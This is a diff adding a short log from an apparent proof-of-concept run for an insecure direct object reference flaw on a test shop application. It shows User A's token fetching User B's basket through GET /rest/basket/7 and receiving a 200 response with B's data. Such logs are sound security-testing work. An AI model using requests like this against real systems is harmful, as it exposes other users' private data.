@@ -1,0 +1,7 @@
+=== IDOR PoC run at 2026-10-04T07:56:06Z ===
+User A: poc-user-a-1791100565@lendwise.test (basket 6)
+User B: poc-user-b-1791100565@lendwise.test (basket 7)
+Exploit request: GET /rest/basket/7 using User A's token
+Response status: 200
+Response body: {"status":"success","data":{"id":7,"coupon":null,"UserId":26,"createdAt":"2026-10-04T07:56:06.376Z","updatedAt":"2026-10-04T07:56:06.376Z","Products":[]}}
+
